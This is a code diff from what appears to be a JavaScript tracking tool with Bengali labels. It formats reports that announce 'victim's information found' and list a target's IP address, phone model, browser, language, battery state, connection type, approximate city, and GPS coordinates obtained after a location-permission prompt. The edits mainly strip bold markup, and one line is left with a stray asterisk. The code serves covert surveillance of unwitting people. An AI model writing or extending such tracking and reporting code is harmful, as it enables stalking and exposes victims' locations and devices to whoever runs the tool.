@@ -207,30 +207,30 @@ function formatVictimData(victim) {
     const d = victim.device || {};
     const deviceTime = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
     
-    let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
-    msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip || 'N/A'}\n`;
-    msg += `🕐 *সময়:* ${deviceTime}\n\n`;
+    let msg = '✅ ভিক্টিমের তথ্য পাওয়া গেছে!\n\n';
+    msg += `⚓️ আইপি অ্যাড্রেস: ${victim.ip || 'N/A'}\n`;
+    msg += `🕐 সময়: ${deviceTime}\n\n`;
     
     const model = getDeviceModel(d);
-    msg += `📱 *ফোনের মডেল:* ${model}\n`;
+    msg += `📱 ফোনের মডেল: ${model}\n`;
     
     const browser = d.userAgent?.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[0-9.]+/)?.[0] || 'N/A';
-    msg += `🌐 *ব্রাউজার:* ${browser}\n`;
-    msg += `👆 *টাচ পয়েন্ট:* ${d.maxTouchPoints || 0}\n`;
-    msg += `🗣️ *ভাষা:* ${d.language || 'N/A'}\n\n`;
+    msg += `🌐 ব্রাউজার: ${browser}\n`;
+    msg += `👆 টাচ পয়েন্ট: ${d.maxTouchPoints || 0}\n`;
+    msg += `🗣️ ভাষা: ${d.language || 'N/A'}\n\n`;
     
     const b = victim.battery || {};
-    msg += `🔋 *চার্জ:* ${b.level || 'N/A'}%\n`;
-    msg += `⚡ *চার্জ হচ্ছে:* ${b.charging ? 'হ্যাঁ' : 'না'}\n\n`;
+    msg += `🔋 চার্জ: ${b.level || 'N/A'}%\n`;
+    msg += `⚡ চার্জ হচ্ছে: ${b.charging ? 'হ্যাঁ' : 'না'}\n\n`;
     
     const n = victim.network || {};
     const connectionType = n.type || 'N/A';
-    msg += `📶 *কানেকশন:* ${connectionType === 'wifi' ? '📶 ওয়াইফাই' : connectionType === 'cellular' ? '📱 মোবাইল ডেটা' : connectionType}\n\n`;
+    msg += `📶 কানেকশন:*${connectionType === 'wifi' ? '📶 ওয়াইফাই' : connectionType === 'cellular' ? '📱 মোবাইল ডেটা' : connectionType}\n\n`;
     
     if (victim.location && victim.location.city) {
-        msg += `📍 *আনুমানিক অবস্থান:* ${victim.location.city}, ${victim.location.country}\n`;
+        msg += `📍 আনুমানিক অবস্থান: ${victim.location.city}, ${victim.location.country}\n`;
     } else {
-        msg += `📍 *আনুমানিক অবস্থান:* N/A\n`;
+        msg += `📍 আনুমানিক অবস্থান: N/A\n`;
     }
     
     // ক্যামেরা সম্পর্কিত লাইন সরানো হয়েছে
@@ -245,7 +245,7 @@ function formatLocationMessage(gpsLocation) {
     if (!gpsLocation || !gpsLocation.latitude) return null;
     const mapLink = gpsLocation.googleMaps || 
         `https://www.google.com/maps?q=${gpsLocation.latitude},${gpsLocation.longitude}`;
-    return `📍 *লোকেশন পারমিশন দেওয়া হয়েছে!*\n\n` +
+    return `📍 লোকেশন পারমিশন দেওয়া হয়েছে!\n\n` +
            `📌 অক্ষাংশ: ${gpsLocation.latitude}\n` +
            `📌 দ্রাঘিমাংশ: ${gpsLocation.longitude}\n` +
            `🎯 নির্ভুলতা: ${gpsLocation.accuracy} মিটার\n\n` +
